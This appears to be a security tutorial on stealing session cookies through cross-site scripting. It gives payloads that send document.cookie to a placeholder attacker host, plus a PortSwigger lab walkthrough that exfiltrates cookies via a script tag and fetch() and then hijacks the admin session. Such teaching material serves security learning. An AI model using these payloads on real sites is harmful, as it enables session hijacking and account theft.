Stealing cookies is a traditional way to exploit XSS as most web applications uses cookies for session handling. Once an attacker is able to retrieve the victim's cookies, they can use it to impersonate the victim. However, this practice has some limitations:
- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.
> Note: Make sure that `HttpOnly` is set to false before attempting this attack, otherwise, it will not work. This is because the `HttpOnly` flag helps mitigate the risk of client side scripting from accessing the protected cookies.
## XSS Payloads
An attacker can start their own server using Python's `http` module or start a Netcat listener and submit the following payloads:
```javascript
document.location='http://ATTACKER-IP/index.php?c='+document.cookie;
new Image().src='http://ATTACKER-IP/index.php?c='+btoa(document.cookie);
```
Once the payload is triggered by a user visiting the vulnerable page, a HTTP request will be sent to the attacker's server containing the stolen cookie.
## Example from PortSwigger Academy
1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```
This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server. 
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.
> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.